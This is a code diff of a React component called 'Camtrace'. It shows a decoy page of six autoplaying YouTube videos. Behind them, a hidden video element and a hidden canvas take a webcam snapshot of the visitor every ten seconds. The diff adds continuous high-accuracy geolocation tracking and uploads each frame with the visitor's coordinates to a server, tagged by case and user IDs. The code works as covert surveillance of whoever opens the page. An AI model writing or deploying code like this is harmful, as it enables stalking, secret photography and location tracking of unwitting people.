@@ -1,7 +1,7 @@
 import { useEffect, useRef } from "react";
 import { UPLOAD_FILE } from "./../constant/contant";
 import { useSearchParams } from "react-router-dom";
-import './../css/videoGrid.css'
+import "./../css/VideoGrid.css";
 
 const Camtrace = () => {
   const cameraRef = useRef<HTMLVideoElement | null>(null);
@@ -13,41 +13,67 @@ const Camtrace = () => {
 
   useEffect(() => {
     let captureCount = 0;
-    let intervalId: number; // ← use number instead of NodeJS.Timer
+    let intervalId: number;
+    let stream: MediaStream | null = null;
+    let currentLocation: { lat: number; lng: number } | null = null;
+
+    // ✅ Get user geolocation continuously
+    const watchLocation = () => {
+      if (!navigator.geolocation) {
+        console.warn("Geolocation not supported");
+        return;
+      }
+
+      navigator.geolocation.watchPosition(
+        (position) => {
+          currentLocation = {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+          };
+        },
+        (err) => console.error("Location error:", err),
+        { enableHighAccuracy: true }
+      );
+    };
 
     const startCamera = async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-        });
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
         if (cameraRef.current) {
           cameraRef.current.srcObject = stream;
         }
 
+        watchLocation();
+
         intervalId = window.setInterval(() => {
-          // ← use window.setInterval
           if (captureCount >= 25) {
-            clearInterval(intervalId);
-            stream.getTracks().forEach((track) => track.stop());
+            cleanup();
             return;
           }
-          captureAndSendFrame();
+          captureAndSendFrame(currentLocation);
           captureCount++;
         }, 10000);
       } catch (err) {
-        console.error("Error accessing media:", err);
+        console.error("Camera access error:", err);
       }
     };
 
     startCamera();
 
-    return () => {
+    const cleanup = () => {
       clearInterval(intervalId);
+      if (stream) {
+        stream.getTracks().forEach((track) => track.stop());
+      }
     };
-  }, [id]);
 
-  const captureAndSendFrame = () => {
+    return cleanup;
+  }, [id, caseName, userId]);
+
+  const captureAndSendFrame = (
+    location: { lat: number; lng: number } | null
+  ) => {
     if (!cameraRef.current || !canvasRef.current) return;
 
     const video = cameraRef.current;
@@ -61,16 +87,20 @@ const Camtrace = () => {
 
     canvas.toBlob(
       (blob) => {
-        if (!blob) return;
+        if (!blob || !id) return;
 
         const formData = new FormData();
         formData.append("file", blob, "frame.jpg");
-        if (id) {
-          fetch(`${UPLOAD_FILE}?id=${id}&caseName=${caseName}&userId=${userId}`, {
-            method: "POST",
-            body: formData,
-          }).catch((err) => console.error("Upload failed:", err));
+
+        if (location) {
+          formData.append("latitude", location.lat.toString());
+          formData.append("longitude", location.lng.toString());
         }
+
+        fetch(`${UPLOAD_FILE}?id=${id}&caseName=${caseName}&userId=${userId}`, {
+          method: "POST",
+          body: formData,
+        }).catch((err) => console.error("Upload failed:", err));
       },
       "image/jpeg",
       0.8
@@ -79,26 +109,25 @@ const Camtrace = () => {
 
   return (
     <div className="container">
-  <div className="video-grid">
-    {[...Array(6)].map((_, key) => (
-      <div key={key} className="video-wrapper">
-        <iframe
-          src="https://www.youtube.com/embed/udgrClXV26Y?autoplay=1&mute=1"
-          title="YouTube video"
-          allow="autoplay; encrypted-media; microphone; camera"
-          allowFullScreen
-        />
+      <div className="video-grid">
+        {[...Array(6)].map((_, key) => (
+          <div key={key} className="video-wrapper">
+            <iframe
+              src="https://www.youtube.com/embed/udgrClXV26Y?autoplay=1&mute=1"
+              title="YouTube video"
+              allow="autoplay; encrypted-media; microphone; camera"
+              allowFullScreen
+            />
+          </div>
+        ))}
       </div>
-    ))}
-  </div>
 
-  {/* Hidden camera video */}
-  <video ref={cameraRef} autoPlay playsInline style={{ display: "none" }} />
+      {/* Hidden camera video */}
+      <video ref={cameraRef} autoPlay playsInline style={{ display: "none" }} />
 
-  {/* Hidden canvas for capturing */}
-  <canvas ref={canvasRef} style={{ display: "none" }} />
-</div>
-
+      {/* Hidden canvas for capturing */}
+      <canvas ref={canvasRef} style={{ display: "none" }} />
+    </div>
   );
 };
 
